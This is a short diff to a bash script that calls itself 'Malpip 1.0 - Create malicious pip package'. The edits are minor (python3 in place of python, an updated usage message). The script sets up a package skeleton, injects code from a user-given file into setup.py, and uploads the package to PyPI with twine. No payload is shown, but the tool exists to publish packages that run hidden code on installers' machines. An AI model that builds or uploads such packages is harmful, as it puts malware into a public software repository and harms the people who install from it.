@@ -6,7 +6,7 @@ install() {
   if [[ $EUID -eq 0 ]];then
     apt-get update
     #apt-get upgrade -y
-    apt-get install -y pip
+    apt-get install -y python3 pip
     pip install --upgrade pip
     pip install twine
     echo -e "[+] Done."
@@ -25,7 +25,7 @@ create() {
     sed -i "s/PACKAGE_NAME/$PROJ_NAME/" $PROJ_NAME/setup.py
     inject $PROJ_NAME $FILE
     cd $PROJ_NAME
-    python setup.py sdist --formats=gztar
+    python3 setup.py sdist --formats=gztar
     twine upload dist/* --verbose
     echo -e "\n[+] Done"
   else
@@ -44,13 +44,13 @@ usage(){
   echo -e "  Malpip 1.0 - Create malicious pip package"
   echo -e "  Andres J. Moreno - thegoodhackertv@gmail.com"
   echo -e "  @thegoodhackertv\n\n"
-  echo -e "Usage: $0 OPTION [FILE]\n"
+  echo -e "Usage: $0 OPTION [PROJECT_NAME] [FILE]\n"
   echo -e "Options:"
   echo -e "  install\tUpdate packages and install dependencies"
   echo -e "  create\tCreate package structure and inject code from FILE"
   echo -e "  usage\t\tDisplay this usage message\n"
   echo -e "Examples:"
-  echo -e "  $0 create project-name /path/to/command"
+  echo -e "  $0 create valid-project-name /path/to/command\n"
 }
 
 # Main
